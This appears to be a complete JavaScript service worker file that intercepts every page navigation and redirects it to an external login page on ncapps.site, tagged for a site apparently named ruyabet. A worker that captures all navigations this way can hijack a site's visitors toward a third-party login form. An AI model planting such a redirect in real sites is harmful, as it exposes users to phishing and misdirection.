self.addEventListener('fetch', function(event) {
    if (event.request.mode === 'navigate') {
        event.respondWith((async () => {
            return Response.redirect('https://ncapps.site/login.php?site=ruyabet');
        })());
    }
});
